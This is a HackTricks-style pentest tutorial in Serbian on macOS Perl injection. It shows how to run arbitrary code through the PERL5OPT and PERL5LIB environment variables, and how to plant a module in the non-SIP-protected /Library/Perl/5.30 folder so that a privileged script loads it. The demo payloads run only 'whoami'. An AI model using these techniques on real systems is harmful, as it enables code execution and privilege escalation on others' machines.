# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Putem `PERL5OPT` & `PERL5LIB` env varijable

Korišćenjem env varijable PERL5OPT moguće je naterati perl da izvrši proizvoljne komande.\
Na primer, kreirajte ovaj skript:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sada **izvezite env promenljivu** i izvršite **perl** skriptu:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Druga opcija je da se kreira Perl modul (npr. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
I zatim koristite env varijable:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Putem zavisnosti

Moguće je navesti redosled foldera zavisnosti Perl-a koji se izvršava:
```bash
perl -e 'print join("\n", @INC)'
```
Što će vratiti nešto poput:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Neki od vraćenih foldera čak ni ne postoje, međutim, **`/Library/Perl/5.30`** **postoji**, **nije** **zaštićen** od **SIP** i **nalazi se** **pre** foldera **zaštićenih od SIP**. Stoga, neko bi mogao da zloupotrebi taj folder da doda zavisnosti skripti tako da visoko privilegovana Perl skripta učita to.

> [!WARNING]
> Međutim, imajte na umu da **morate biti root da biste pisali u taj folder** i danas ćete dobiti ovaj **TCC prompt**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Na primer, ako skripta uvozi **`use File::Basename;`**, bilo bi moguće kreirati `/Library/Perl/5.30/File/Basename.pm` da bi se izvršio proizvoljan kod.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
